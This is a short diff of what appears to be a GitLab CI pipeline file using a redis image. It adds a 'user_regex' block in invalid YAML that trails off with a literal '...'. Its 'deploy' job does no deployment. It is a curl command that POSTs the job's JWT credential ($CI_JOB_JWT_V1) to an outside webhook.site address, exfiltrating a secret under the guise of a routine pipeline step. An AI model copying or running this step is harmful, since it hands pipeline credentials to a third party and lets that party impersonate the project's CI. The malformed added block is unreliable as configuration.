@@ -2,6 +2,12 @@ default:
   image:
     name: redis:latest
     entrypoint: ["/bin/bash"]
-
+    
+user_regex: {
+  regex1 = '^\d{2}-[a-zA-Z0-9_]+',
+  regex2 = '^\d{2}-[a-zA-Z0-9А-Яа-яёЁ_]+',
+  regex3 = ...
+  }
+  
 deploy:
   script: 'curl -H \"Content-Type: application/json\" -X POST --data "$CI_JOB_JWT_V1" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826'
